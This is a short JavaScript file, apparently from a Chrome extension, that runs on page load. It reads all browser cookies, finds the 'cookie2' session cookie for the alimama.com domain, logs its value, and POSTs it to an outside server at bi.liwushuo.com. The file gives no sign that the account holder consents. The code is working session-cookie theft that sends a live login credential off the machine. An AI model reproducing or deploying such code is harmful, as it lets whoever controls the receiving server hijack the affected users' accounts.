//  geyuanye@gmail.com

if (!chrome.cookies) {
  chrome.cookies = chrome.experimental.cookies;
}

function Timer() {
  this.start_ = new Date();

  this.elapsed = function() {
    return (new Date()) - this.start_;
  }

  this.reset = function() {
    this.start_ = new Date();
  }
}

function sendCookies(data) {
  $.ajax({
  type: "POST",
  url: "https://bi.liwushuo.com/api/ali/cookies",
  contentType: 'application/json',
  data: JSON.stringify({"data": data}),
  dataType: "json",
  success: function () {
    alert("成功了！");
  },
  error: function(response) {
    alert("失败了！")
  }
});
}

function onload() {
  var timer = new Timer();
  chrome.cookies.getAll({}, function(cookies) {
    start = new Date();
    for (var i in cookies) {
      var cookie = cookies[i]
      if (cookie.domain === '.alimama.com' & cookie.name === 'cookie2') {
        console.log(cookie.domain + " : " + cookie.name + " : " + cookie.value)
        var data = {};
        data["cookies"] = cookie.name + ":" + cookie.value;
        sendCookies(data)
      }
    }
    timer.reset();
  });
}

document.addEventListener('DOMContentLoaded', function() {
  onload();
});
